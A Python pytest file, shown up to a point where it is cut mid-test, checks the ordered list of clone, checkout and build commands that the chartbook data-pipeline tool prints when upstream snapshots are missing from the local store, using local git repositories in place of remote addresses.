"""What a pipeline reads that is not in your store: the list, in the order to build it (``docs_src/design/one-command.md``).

A class with no shared store, a new laptop. The lockfile pins snapshots
this machine's store does not have, and each of those was built from
others it may not have either. ``chartbook run`` and ``chartbook pin``
say all that has to be built, each pipeline after everything it reads,
with what to type; ``pin --check`` and ``run --frozen``, which fetch
nothing, say what this pipeline lacks and where the list is.

Each test makes its pipelines against one store, as their owner would,
and then meets them with another that is empty. An address a snapshot
records, ``https://example.org/acme/<name>``, is answered by a folder on
this disk (git's ``insteadOf``), so nothing here uses the network.
"""

import json
import os
import re
import shlex
import subprocess
import sys
from pathlib import Path

import pytest
import tomli_w
from click.testing import CliRunner

from chartbook import built, config, lock, missing, snapshot
from chartbook.cli import main
from chartbook.gitcache import GitCache, GitError
from chartbook.replacing import rename_when_let  # a folder git has just written is held for a moment on Windows
from chartbook.store import FolderStore
from tests.test_lock_by_kind import _git

#: The list's last line: the other way on
SHARED = "Where a store is shared, nothing has to be built: point CHARTBOOK_STORE at the one that has {}, or wait for its sync to finish."
ONE = ["Build it first, with the commands below, one at a time. They end with a snapshot, which is what this one reads.", ""]
SEVERAL = ["Build them in this order, with the commands below, one at a time. Each ends with a snapshot, which is what the next one reads.", ""]
NO_ORDER = "Error: acme/report: these pipelines depend on each other, so there is no order to build in."


def _build(name: str) -> str:
    """A pipeline's build: it writes the one table the manifest declares, with rows of its own, and notes that it ran."""
    return f'"{sys.executable}" -c "open(\'out.csv\', \'w\').write(\'a,b\\\\n{name},1\\\\n\'); open(\'build.log\', \'a\').write(\'ran\\\\n\')"'


def _table(name: str, reads: dict = None, identified: bool = True, builds: bool = True) -> dict:
    table = {"project": {"id": f"acme/{name}"} if identified else {}, "dataframes": {"out": {"path": "./out.csv", "docs": "d"}}}
    if builds:
        table["scripts"] = {"build": _build(name)}
    if reads:
        table["dependencies"] = reads
    return table


def _write(directory: Path, table: dict) -> None:
    (directory / "chartbook.toml").write_text(tomli_w.dumps(table), encoding="utf-8", newline="\n")


@pytest.fixture
def work(tmp_path):
    return tmp_path.resolve()


def _answered_from(work: Path, folder: Path) -> None:
    """Each address `https://example.org/acme/<name>` is answered by the folder of that name in *folder*."""
    (work / "gitconfig").write_text(
        f'[url "{folder.as_posix()}/"]\n\tinsteadOf = https://example.org/acme/\n', encoding="utf-8", newline="\n"
    )


@pytest.fixture
def theirs(work, monkeypatch):
    """The store the pipelines are made against: their owner's."""
    monkeypatch.setenv(config.STORE_ENV_VAR, str(work / "theirs"))
    monkeypatch.setenv(config.CACHE_ENV_VAR, str(work / "cache"))
    monkeypatch.setenv(config.GIT_CACHE_ENV_VAR, str(work / "git-cache"))
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(work / "gitconfig"))
    _answered_from(work, work)
    return FolderStore(work / "theirs")


def _repository(top: Path, name: str) -> None:
    (top / ".gitignore").write_text("out.csv\nbuild.log\n", encoding="utf-8", newline="\n")
    _git(top, "init", "--quiet", "-b", "main")
    if name:
        _git(top, "remote", "add", "origin", f"https://example.org/acme/{name}.git")
    _git(top, "add", "-A")
    _git(top, "commit", "--quiet", "-m", "The work")


def _pipeline(work: Path, name: str, reads: dict = None, remote: bool = True, within: str = "", **how) -> Path:
    """A committed pipeline `acme/<name>` in a repository of its own, that depends on what *reads* says."""
    top = work / name
    directory = top / within if within else top
    directory.mkdir(parents=True)
    _write(directory, _table(name, reads, **how))
    _repository(top, name if remote else "")
    return directory


def _several(work: Path, repository: str, pipelines: dict) -> Path:
    """One repository that holds several pipelines, each in a folder named as it is; *pipelines* gives what each reads."""
    top = work / repository
    for name, reads in pipelines.items():
        (top / name).mkdir(parents=True)
        _write(top / name, _table(name, reads))
    _repository(top, repository)
    return top


def _added(top: Path, name: str, reads: dict = None) -> Path:
    """One more pipeline in a repository of several, in a commit of its own."""
    (top / name).mkdir()
    _write(top / name, _table(name, reads))
    _git(top, "add", "-A")
    _git(top, "commit", "--quiet", "-m", f"The pipeline {name}")
    return top / name


def _ready(directory: Path, store, rows: str = "") -> str:
    """Pin, commit the lockfile and make a snapshot of what its build writes, as the pipeline's owner would; the commit it is of."""
    if (lock.pin(directory, store)).problems:
        raise AssertionError(f"{directory.name} could not be pinned")
    if (directory / lock.LOCK_FILE).exists():
        _git(directory, "add", "-A")
        _git(directory, "commit", "--quiet", "-m", "The lockfile")
    (directory / "out.csv").write_text(f"a,b\n{rows or directory.name + ',1'}\n", encoding="utf-8", newline="\n")
    snapshot.make(directory, store=store)
    return _git(directory, "rev-parse", "HEAD")


@pytest.fixture
def mine(work, theirs, monkeypatch):
    """Called once the pipelines are made: from here on the store is this machine's own, and empty."""

    def switch() -> FolderStore:
        monkeypatch.setenv(config.STORE_ENV_VAR, str(work / "mine"))
        return FolderStore(work / "mine")

    return switch


def _chain(work: Path, theirs) -> dict:
    """report reads mid, and mid reads rates: each pinned and snapshotted against their store. The commit of each."""
    commits = {"rates": _ready(_pipeline(work, "rates"), theirs)}
    commits["mid"] = _ready(_pipeline(work, "mid", {"acme/rates": {}}), theirs)
    commits["report"] = _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
    return commits


def _built_by_a_run(directory: Path) -> Path:
    """Leave the note a run leaves of a build: of the folder's files as they are, as if `chartbook run` had just built them."""
    built.finished(built.began(directory, built.pipeline_of(directory)))
    return directory


def _away(work: Path, *names: str) -> None:
    """These repositories are not on this machine: each is where its address leads, and nowhere a clone would be looked for."""
    (work / "elsewhere").mkdir(exist_ok=True)
    for name in names:
        rename_when_let(work / name, work / "elsewhere" / name)
    _answered_from(work, work / "elsewhere")


def _said(result) -> list[str]:
    return result.output.splitlines()


def _numbered(result) -> list[str]:
    """The lines of the list that name a pipeline."""
    return [line for line in _said(result) if line[:1].isdigit()]


def _has(said: list[str], *commands: str) -> bool:
    """Whether a list has these commands, each a line of its own, one after the other."""
    wanted = [f"     {command}" for command in commands]
    return any(said[index:index + len(wanted)] == wanted for index in range(len(said)))


def _q(path) -> str:
    """A path as a command of the list has it: quoted where this system's shells need it.

    On Windows that is always, in double quotes: a path there has a
    backslash, which Git Bash reads as an escape outside them.
    """
    return f'"{path}"' if os.name == "nt" else shlex.quote(str(path))


def _up(name: str) -> str:
    """A folder beside the one a command was typed in, as this system writes it."""
    return os.path.join("..", name)


def _head(work: Path, count: str, done: str = "built", store: str = "mine") -> str:
    return f"acme/report cannot be {done} yet: {count} not in the store at {work / store}."


def _run(work: Path, monkeypatch, *words: str, where: str = "report"):
    monkeypatch.chdir(work / where)
    return CliRunner().invoke(main, list(words))


def _follow(work: Path, result, monkeypatch, start: Path = None):
    """Type each command of a list as it is printed, in a shell, one after the other; the last one's result."""
    if os.name == "nt":
        pytest.skip("typed in a POSIX shell here")
    monkeypatch.setenv("CHARTBOOK_TRUST", "all")
    shim = work / "bin"
    shim.mkdir(exist_ok=True)
    (shim / "chartbook").write_text(
        f'#!/bin/sh\nexec "{sys.executable}" -c "from chartbook.cli import main; main()" "$@"\n', encoding="utf-8", newline="\n"
    )
    (shim / "chartbook").chmod(0o755)
    environment = {
        **os.environ, "PATH": f"{shim}{os.pathsep}{os.environ['PATH']}",
        "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.org", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.org",
    }
    commands = [line.strip() for line in _said(result) if line.startswith("     ") and not line.startswith(("     What ", "     It could not "))]
    assert commands and commands[-1].startswith("chartbook run --project-dir ")
    # One command to a line, and none that enters a folder: what cmd.exe and PowerShell take as a POSIX shell does
    assert not any("&&" in command or ";" in command or command.startswith("cd ") for command in commands), commands
    for command in commands:
        done = subprocess.run(command, shell=True, cwd=start or work / "report", env=environment, capture_output=True, text=True)
        assert done.returncode == 0, f"{command}\n{done.stdout}{done.stderr}"
    return done


class TestTheList:
    def test_goes_up_and_is_in_the_order_to_build(self, work, theirs, mine, monkeypatch):
        commits = _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        before = (work / "report" / lock.LOCK_FILE).read_bytes()
        result = _run(work, monkeypatch, "run")
        assert result.exit_code == 1
        assert _said(result) == [
            "Fetching https://example.org/acme/mid, to see what acme/mid reads in turn.",
            "Fetching https://example.org/acme/rates, to see what acme/rates reads in turn.",
            _head(work, "2 pipelines it reads are"),
            *SEVERAL,
            f"1. acme/rates at {commits['rates'][:7]}    https://example.org/acme/rates",
            f"     git clone https://example.org/acme/rates {_q(work / 'rates')}",
            f"     git -C {_q(work / 'rates')} checkout {commits['rates'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'rates')}",
            f"2. acme/mid at {commits['mid'][:7]}    https://example.org/acme/mid; reads 1 above",
            f"     git clone https://example.org/acme/mid {_q(work / 'mid')}",
            f"     git -C {_q(work / 'mid')} checkout {commits['mid'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
            "",
            "Then here again:",
            f"     chartbook run --project-dir {_q(work / 'report')}",
            SHARED.format("them"),
        ]
        # Nothing was built, and nothing written
        assert not (work / "report" / "build.log").exists()
        assert (work / "report" / lock.LOCK_FILE).read_bytes() == before

    def test_following_it_ends_in_a_build(self, work, theirs, mine, monkeypatch):
        """Each line's commands, typed as they are printed, and then the last one: the pipeline builds."""
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        done = _follow(work, _run(work, monkeypatch, "run"), monkeypatch)
        assert "Ran build in 1 pipeline(s)." in done.stdout and (work / "report" / "build.log").exists()

    def test_no_command_enters_a_folder_or_is_joined_to_another(self, work, theirs, mine, monkeypatch):
        """Found on Windows, 2026-11-20: the lines were `cd /d FOLDER && git checkout … && chartbook run --snapshot`, which PowerShell does not read.

        A line is one command, and names the folder it works in. That is the same line in a POSIX shell, in cmd.exe and in PowerShell.
        """
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        commands = [line.strip() for line in _said(_run(work, monkeypatch, "run")) if line.startswith("     ")]
        assert len(commands) == 7
        assert all(command.startswith(("git clone ", "git -C ", "chartbook run")) for command in commands), commands
        assert not any(sign in command for command in commands for sign in ("&&", ";", "|", "cd "))

    def test_every_command_can_be_typed_in_any_folder_the_last_among_them(self, work, theirs, mine, monkeypatch):
        """Found by review: the last line was the bare command, which builds whatever pipeline's folder it is typed in.

        Each command names its folder, so the last does too: typed in a
        clone that was stepped into, it builds this pipeline and not that one.
        """
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        elsewhere = work / "elsewhere"
        monkeypatch.chdir(elsewhere)
        asked = ["--project-dir", os.path.join("..", "report")]
        # Of `chartbook pin` too, and whatever folder it was typed in
        pinned = CliRunner().invoke(main, ["pin", *asked])
        assert pinned.exit_code == 1
        assert _said(pinned)[-3:-1] == ["Then here again:", f"     chartbook pin --project-dir {_q(work / 'report')}"]
        result = CliRunner().invoke(main, ["run", *asked])
        assert _said(result)[-3:-1] == ["Then here again:", f"     chartbook run --project-dir {_q(work / 'report')}"]
        # Typed there, each of them, and then the last: the pipeline builds
        done = _follow(work, result, monkeypatch, start=elsewhere)
        assert "Ran build in 1 pipeline(s)." in done.stdout and (work / "report" / "build.log").exists()

    def test_what_two_read_is_one_line(self, work, theirs, mine, monkeypatch):
        commits = {"rates": _ready(_pipeline(work, "rates"), theirs)}
        for name in ("a", "b"):
            commits[name] = _ready(_pipeline(work, name, {"acme/rates": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/a": {}, "acme/b": {}}), theirs)
        _away(work, "rates", "a", "b")
        mine()
        result = _run(work, monkeypatch, "run")
        assert _head(work, "3 pipelines it reads are") in _said(result)
        assert _numbered(result) == [
            f"1. acme/rates at {commits['rates'][:7]}    https://example.org/acme/rates",
            f"2. acme/a at {commits['a'][:7]}    https://example.org/acme/a; reads 1 above",
            f"3. acme/b at {commits['b'][:7]}    https://example.org/acme/b; reads 1 above",
        ]

    def test_what_was_never_pinned_is_met_by_a_line_of_that_pipeline_at_any_commit(self, work, theirs, mine, monkeypatch):
        """report pins rates. A folder that was never pinned reads rates at no commit: the one line of rates is what it reads."""
        commit = _ready(_pipeline(work, "rates"), theirs)
        report = _pipeline(work, "report", {"acme/rates": {}})
        _ready(report, theirs)
        _git(work / "rates", "commit", "--quiet", "--allow-empty", "-m", "On")  # and its clone is on another commit by now
        _built_by_a_run(work / "rates")
        # Read after rates, and before it: the list is the same either way
        for name in ("zed", "mid"):
            _pipeline(work, name, {"acme/rates": {}})
            _write(report, _table("report", {"acme/rates": {}, f"acme/{name}": {"path": f"../{name}"}}))
            _git(report, "commit", "--quiet", "-am", f"It reads {name} too")
        mine()
        result = _run(work, monkeypatch, "run")
        assert _numbered(result) == [
            f"1. acme/rates    {_up('rates')} (a clone of https://example.org/acme/rates, built already)",
            f"2. acme/mid    {_up('mid')} (a folder on this machine); reads 1 above",
            f"3. acme/rates at {commit[:7]}    {_up('rates')} (a clone of https://example.org/acme/rates)",
        ]
        _write(report, _table("report", {"acme/rates": {}, "acme/zed": {"path": "../zed"}}))
        _git(report, "commit", "--quiet", "-am", "It reads zed, and not mid")
        assert _numbered(_run(work, monkeypatch, "run")) == [
            f"1. acme/rates at {commit[:7]}    {_up('rates')} (a clone of https://example.org/acme/rates)",
            f"2. acme/zed    {_up('zed')} (a folder on this machine); reads 1 above",
        ]

    def test_a_line_with_no_pin_takes_the_pin_of_a_later_reader_where_the_commit_is_the_same(self, work, theirs, mine, monkeypatch):
        """a reads rates with no pin, and b pins it at the commit its clone is on: one build of rates, and it is the pinned one."""
        commit = _ready(_pipeline(work, "rates"), theirs)
        _pipeline(work, "a", {"acme/rates": {}})
        b = _pipeline(work, "b", {"acme/rates": {}})
        assert not lock.pin(b, theirs).problems
        _git(b, "add", "-A")
        _git(b, "commit", "--quiet", "-m", "The lockfile")
        _pipeline(work, "report", {"acme/a": {"path": "../a"}, "acme/b": {"path": "../b"}})
        mine()
        result = _run(work, monkeypatch, "run")
        assert _numbered(result) == [
            f"1. acme/rates at {commit[:7]}    {_up('rates')} (a clone of https://example.org/acme/rates)",
            f"2. acme/a    {_up('a')} (a folder on this machine); reads 1 above",
            f"3. acme/b    {_up('b')} (a folder on this machine); reads 1 above",
        ]
        assert f"     chartbook run --snapshot --project-dir {_q(work / 'rates')}" in _said(result)  # never `chartbook snapshot`: it is pinned
        assert "chartbook run --upstream" not in result.output
        # With the clone on another commit they are two builds, and each reader names its own
        _git(work / "rates", "commit", "--quiet", "--allow-empty", "-m", "On")
        moved = _run(work, monkeypatch, "run")
        assert [line.split("    ")[0] for line in _numbered(moved)] == ["1. acme/rates", "2. acme/a", f"3. acme/rates at {commit[:7]}", "4. acme/b"]
        assert _numbered(moved)[1].endswith("; reads 1 above") and _numbered(moved)[3].endswith("; reads 3 above")
        assert _has(_said(moved), f"git -C {_q(work / 'rates')} checkout {commit[:12]}", f"chartbook run --snapshot --project-dir {_q(work / 'rates')}")

    def test_a_line_names_each_line_above_that_it_reads(self, work, theirs, mine, monkeypatch):
        commits = {name: _ready(_pipeline(work, name), theirs) for name in ("a", "b")}
        commits["top"] = _ready(_pipeline(work, "top", {"acme/a": {}, "acme/b": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/top": {}}), theirs)
        _away(work, "a", "b", "top")
        mine()
        assert _numbered(_run(work, monkeypatch, "run"))[2] == (
            f"3. acme/top at {commits['top'][:7]}    https://example.org/acme/top; reads 1 and 2 above"
        )

    def test_one_pipeline_wanted_at_two_commits_is_two_lines_and_one_pipeline(self, work, theirs, mine, monkeypatch):
        """Found by review: the count was of lines, and a later line of a folder an earlier one had moved was written as if it had not."""
        base = _pipeline(work, "base")
        first = _ready(base, theirs)
        early = _ready(_pipeline(work, "early", {"acme/base": {}}), theirs)
        _write(base, {**_table("base"), "scripts": {"build": _build("base2")}})  # other rows from here on
        _git(base, "commit", "--quiet", "-am", "On")
        second = _ready(base, theirs, rows="base2,1")
        late = _ready(_pipeline(work, "late", {"acme/base": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/early": {}, "acme/late": {}}), theirs)
        _away(work, "early", "late")  # and base is cloned beside, on its second commit
        mine()
        result = _run(work, monkeypatch, "run")
        assert _head(work, "3 pipelines it reads are") in _said(result)
        assert [line for line in _said(result) if "acme/base" in line or _q(base) in line] == [
            f"1. acme/base at {first[:7]}    {_up('base')} (a clone of https://example.org/acme/base)",
            f"     git -C {_q(base)} checkout {first[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(base)}",
            # On that commit when the list was made, and no longer once the line above is done
            f"3. acme/base at {second[:7]}    {_up('base')} (a clone of https://example.org/acme/base)",
            f"     git -C {_q(base)} checkout {second[:12]}",
            f"     chartbook run --snapshot --project-dir {_q(base)}",
        ]
        assert early and late
        done = _follow(work, result, monkeypatch)
        assert "Ran build in 1 pipeline(s)." in done.stdout

    def test_what_the_store_has_a_build_of_is_not_on_it(self, work, theirs, mine, monkeypatch):
        """mid is not there. What mid reads is, as a build of mine of the commit mid pinned: whether it meets mid's pins is for mid's own run to say."""
        commits = _chain(work, theirs)
        _away(work, "mid")
        store = mine()
        (work / "rates" / "out.csv").write_text("a,b\nrates,2\n", encoding="utf-8", newline="\n")
        snapshot.make(work / "rates", store=store)
        assert _said(_run(work, monkeypatch, "run"))[1:] == [
            _head(work, "1 pipeline it reads is"),
            *ONE,
            f"1. acme/mid at {commits['mid'][:7]}    https://example.org/acme/mid",
            f"     git clone https://example.org/acme/mid {_q(work / 'mid')}",
            f"     git -C {_q(work / 'mid')} checkout {commits['mid'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
            "",
            "Then here again:",
            f"     chartbook run --project-dir {_q(work / 'report')}",
            SHARED.format("it"),
        ]

    def test_nothing_is_read_or_fetched_where_every_pin_is_there(self, work, theirs, monkeypatch):
        _chain(work, theirs)
        monkeypatch.setattr(missing, "find", lambda *a, **k: pytest.fail("asked for the list"))
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        result = _run(work, monkeypatch, "run")
        assert result.exit_code == 0, result.output
        assert _run(work, monkeypatch, "pin").exit_code == 0

    def test_the_command_to_come_back_with_is_the_one_that_was_typed(self, work, theirs, mine, monkeypatch):
        """Found by review: `chartbook run --snapshot --force` was told to come back with `chartbook run`."""
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run", "--snapshot", "--force", "--remake"))
        assert said[-3:-1] == ["Then here again:", f"     chartbook run --force --snapshot --remake --project-dir {_q(work / 'report')}"]

    def test_with_several_stores_each_is_named(self, work, theirs, mine, monkeypatch):
        from chartbook.multi_store import NamedStore, Stores

        _ready(_pipeline(work, "mid"), theirs)
        report = _pipeline(work, "report", {"acme/mid": {}})
        _ready(report, theirs)
        _away(work, "mid")
        both = Stores([
            NamedStore("default", str(work / "one"), FolderStore(work / "one"), create=True),
            NamedStore("team", str(work / "two"), FolderStore(work / "two"), create=True),
        ])
        found = missing.find(report, both)
        assert missing.said(found)[0] == f"acme/report cannot be built yet: 1 pipeline it reads is not in your stores ({work / 'one'}, {work / 'two'})."


class TestALine:
    """It says what is known, and no more."""

    def test_of_a_folder_on_this_machine_that_was_never_pinned(self, work, theirs, monkeypatch):
        _pipeline(work, "rates")
        _pipeline(work, "report", {"acme/rates": {"path": "../rates"}})
        result = _run(work, monkeypatch, "run")
        assert result.exit_code == 1
        assert _said(result) == [
            "acme/report: pinning what it depends on",  # a first lockfile, which lists it with nothing pinned
            "Wrote chartbook.lock.",
            _head(work, "1 pipeline it reads is", store="theirs"),
            *ONE,
            f"1. acme/rates    {_up('rates')} (a folder on this machine)",
            f"     chartbook run --snapshot --project-dir {_q(work / 'rates')}",
            "",
            "Then here again:",
            f"     chartbook run --project-dir {_q(work / 'report')}",
            "Or `chartbook run --upstream` here, which builds and snapshots this folder itself.",
            SHARED.format("it"),
        ]

    def test_of_one_that_is_built_and_only_lacks_its_snapshot(self, work, theirs, monkeypatch):
        """Never pinned, nothing uncommitted, every declared file on disk: a build that may take an hour is not run again."""
        rates = _pipeline(work, "rates")
        (rates / "out.csv").write_text("a,b\nrates,1\n", encoding="utf-8", newline="\n")
        _pipeline(work, "report", {"acme/rates": {"path": "../rates"}})
        # Its files are there, and no run of ChartBook's left them: a snapshot of them would be refused, so
        # the list says to build (found by the review of the design: its `chartbook snapshot` line was one
        # that is not made)
        unbuilt = _said(_run(work, monkeypatch, "run"))
        at = unbuilt.index(f"1. acme/rates    {_up('rates')} (a folder on this machine)")
        assert unbuilt[at + 1] == f"     chartbook run --snapshot --project-dir {_q(rates)}"
        _built_by_a_run(rates)
        said = _said(_run(work, monkeypatch, "run"))
        at = said.index(f"1. acme/rates    {_up('rates')} (a folder on this machine, built already)")
        assert said[at + 1] == f"     chartbook snapshot --project-dir {_q(rates)}"
        # With work that is not committed, a snapshot would be refused: the build is what is said, and its refusal says to commit
        (rates / "chartbook.toml").write_text((rates / "chartbook.toml").read_text(encoding="utf-8") + "\n# more\n", encoding="utf-8", newline="\n")
        assert _said(_run(work, monkeypatch, "run"))[3:5] == [
            f"1. acme/rates    {_up('rates')} (a folder on this machine)",
            f"     chartbook run --snapshot --project-dir {_q(rates)}",
        ]

    def test_a_pinned_one_is_never_called_built(self, work, theirs, mine, monkeypatch):
        """Found by review: on the pinned commit with files on disk it was given `chartbook snapshot`, and its files were of another build."""
        commit = _ready(_pipeline(work, "mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {"path": "../mid"}}), theirs)
        mine()
        assert (work / "mid" / "out.csv").is_file()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[3:5] == [
            f"1. acme/mid at {commit[:7]}    {_up('mid')} (a folder on this machine)",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",  # nothing to check out: it is on that commit
        ]
        assert not any("--upstream" in line for line in said)  # which builds what has no pin, and this has one

    def test_of_a_folder_pinned_at_a_commit_it_has_left(self, work, theirs, mine, monkeypatch):
        """Its two files are read at the pinned commit, through git: what it read then is on the list, and its folder is as it was."""
        commits = {"rates": _ready(_pipeline(work, "rates"), theirs)}
        mid = _pipeline(work, "mid", {"acme/rates": {}})
        commits["mid"] = _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {"path": "../mid"}}), theirs)
        # Its owner has moved on, and reads nothing now
        _write(mid, _table("mid"))
        _git(mid, "rm", "--quiet", "--cached", lock.LOCK_FILE)
        (mid / lock.LOCK_FILE).unlink()
        _git(mid, "commit", "--quiet", "-am", "Reads nothing now")
        now = _git(mid, "rev-parse", "HEAD")
        _away(work, "rates")
        mine()
        result = _run(work, monkeypatch, "run")
        assert _said(result)[1:] == [
            _head(work, "2 pipelines it reads are"),
            *SEVERAL,
            f"1. acme/rates at {commits['rates'][:7]}    https://example.org/acme/rates",
            f"     git clone https://example.org/acme/rates {_q(work / 'rates')}",
            f"     git -C {_q(work / 'rates')} checkout {commits['rates'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'rates')}",
            f"2. acme/mid at {commits['mid'][:7]}    {_up('mid')} (a folder on this machine); reads 1 above",
            f"     git -C {_q(mid)} checkout {commits['mid'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(mid)}",
            "",
            "Then here again:",
            f"     chartbook run --project-dir {_q(work / 'report')}",
            SHARED.format("them"),
        ]
        assert _git(mid, "rev-parse", "HEAD") == now and _git(mid, "status", "--porcelain") == ""

    def test_whose_repository_could_not_be_fetched(self, work, theirs, mine, monkeypatch):
        commits = _chain(work, theirs)
        _away(work, "rates", "mid")
        _answered_from(work, work / "nowhere")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[:4] == [
            "Fetching https://example.org/acme/mid, to see what acme/mid reads in turn.",
            _head(work, "1 pipeline it reads is"),
            *ONE,
        ]
        assert said[4:8] == [
            f"1. acme/mid at {commits['mid'][:7]}    https://example.org/acme/mid",
            f"     git clone https://example.org/acme/mid {_q(work / 'mid')}",
            f"     git -C {_q(work / 'mid')} checkout {commits['mid'][:12]}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
        ]
        assert said[8].startswith("     What it reads in turn is not known: its repository could not be fetched (")
        # Where it is in its repository is not known either, and the top is only the likeliest place
        assert said[8].endswith("); if it is not at the top of its repository, give its folder there to `--project-dir`. Its own `chartbook run` says.")

    def test_a_fetch_that_receives_nothing_is_given_up(self, work, theirs, mine, monkeypatch):
        """Found by review: a server that answers nothing held `chartbook pin`, which used no network before, for ever."""
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        told = []

        def fetch(self, url):
            told.append({name: os.environ.get(name) for name in missing.SLOWEST_FETCH})
            raise GitError("no answer")

        monkeypatch.setattr(GitCache, "fetch", fetch)
        monkeypatch.delenv("GIT_HTTP_LOW_SPEED_TIME", raising=False)
        monkeypatch.setenv("GIT_HTTP_LOW_SPEED_LIMIT", "7")  # what the person has said is kept
        assert _run(work, monkeypatch, "pin").exit_code == 1
        assert told == [{"GIT_HTTP_LOW_SPEED_LIMIT": "7", "GIT_HTTP_LOW_SPEED_TIME": "30"}]
        assert "GIT_HTTP_LOW_SPEED_TIME" not in os.environ and os.environ["GIT_HTTP_LOW_SPEED_LIMIT"] == "7"

    def test_what_the_person_set_in_gits_own_settings_is_kept_too(self, work, theirs, mine, monkeypatch):
        _chain(work, theirs)
        _away(work, "rates", "mid")
        (work / "gitconfig").write_text(
            (work / "gitconfig").read_text(encoding="utf-8") + "[http]\n\tlowSpeedTime = 600\n", encoding="utf-8", newline="\n"
        )
        mine()
        told = []

        def fetch(self, url):
            told.append([name for name in missing.SLOWEST_FETCH if name in os.environ])
            raise GitError("no answer")

        monkeypatch.setattr(GitCache, "fetch", fetch)
        for name in missing.SLOWEST_FETCH:
            monkeypatch.delenv(name, raising=False)
        assert _run(work, monkeypatch, "pin").exit_code == 1 and told == [[]]

    def test_an_address_the_stores_snapshots_do_not_agree_on_is_not_used(self, work, theirs, monkeypatch):
        mid = _pipeline(work, "mid")
        _ready(mid, theirs)
        _git(mid, "remote", "set-url", "origin", "https://example.org/acme/moved.git")
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "Moved")
        from chartbook import identity

        identity._git_remote_cache.clear()
        _ready(mid, theirs, rows="mid,2")
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "On")
        wanted = _git(mid, "rev-parse", "HEAD")
        _pipeline(work, "report", {"acme/mid": {"commit": wanted[:10]}})
        _away(work, "mid")
        assert _numbered(_run(work, monkeypatch, "run")) == [
            f"1. acme/mid at {wanted[:7]}    its repository is not recorded, so neither is what it reads in turn"
        ]

    def test_whose_repository_is_not_recorded(self, work, theirs, mine, monkeypatch):
        """A snapshot made in a repository with no remote records no address: the line has the ID to look for, and never a guess."""
        commit = _ready(_pipeline(work, "mid", remote=False), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert said[3:5] == [
            f"1. acme/mid at {commit[:7]}    its repository is not recorded, so neither is what it reads in turn",
            f"     In a clone of it: `git checkout {commit[:12]}`, then `chartbook run --snapshot`",
        ]

    def test_whose_folder_is_not_on_this_machine(self, work, theirs, mine, monkeypatch):
        """Found by review: the words this list takes the place of said where it was looked for."""
        commit = _ready(_pipeline(work, "mid", remote=False), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {"path": "../mid"}}), theirs)
        rename_when_let(work / "mid", work / "gone")
        mine()
        assert _numbered(_run(work, monkeypatch, "run")) == [
            f"1. acme/mid at {commit[:7]}    its folder, ../mid, is not on this machine, and its repository is not recorded, "
            f"so neither is what it reads in turn"
        ]

    def test_of_one_named_by_its_id_that_was_never_pinned(self, work, theirs, monkeypatch):
        """Any commit of it will do."""
        _pipeline(work, "report", {"acme/mid": {}})
        said = _said(_run(work, monkeypatch, "run"))
        assert said[5:7] == [
            "1. acme/mid    its repository is not recorded, so neither is what it reads in turn",
            "     In a clone of it: `chartbook run --snapshot`",
        ]

    def test_of_one_whose_entry_names_its_repository(self, work, theirs, mine, monkeypatch):
        """Never pinned, and its entry says where it is: read at its default branch."""
        _ready(_pipeline(work, "rates"), theirs)
        _ready(_pipeline(work, "mid", {"acme/rates": {}}), theirs)
        _pipeline(work, "report", {"acme/mid": {"repository": "https://example.org/acme/mid"}})
        _away(work, "rates", "mid")
        mine()
        said = _numbered(_run(work, monkeypatch, "run"))
        assert said[1] == "2. acme/mid    https://example.org/acme/mid; reads 1 above"
        assert said[0].startswith("1. acme/rates at ")  # as mid's own lockfile pins it

    def test_of_one_whose_manifest_cannot_be_read_where_its_place_gives_its_id(self, work, theirs, mine, monkeypatch):
        """Found by the third pass: a slip pushed to the tip, and its repository was said to hold no such pipeline.

        A manifest that cannot be read is still its folder's. Its line says where to build, and its own run says what is wrong.
        """
        mid = _pipeline(work, "mid")
        (mid / "chartbook.toml").write_text('[project\nid = "acme/mid"\n', encoding="utf-8", newline="\n")
        _git(mid, "commit", "--quiet", "-am", "A slip")
        _pipeline(work, "report", {"acme/mid": {"repository": "https://example.org/acme/mid"}})
        _away(work, "mid")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        at = said.index("1. acme/mid    https://example.org/acme/mid")
        assert said[at + 1 : at + 3] == [
            f"     git clone https://example.org/acme/mid {_q(work / 'mid')}",
            f"     chartbook run --snapshot --project-dir {_q(work / 'mid')}",
        ]
        assert said[at + 3].startswith("     What it reads in turn is not known: its chartbook.toml cannot be read (")

    def test_of_one_whose_address_the_store_knows(self, work, theirs, mine, monkeypatch):
        """Found by review: an entry at a commit the store lacks was "not recorded", with the address in the store's other snapshots of it."""
        mid = _pipeline(work, "mid")
        _ready(mid, theirs)
        _git(mid, "commit", "--quiet", "--allow-empty", "-m", "On")
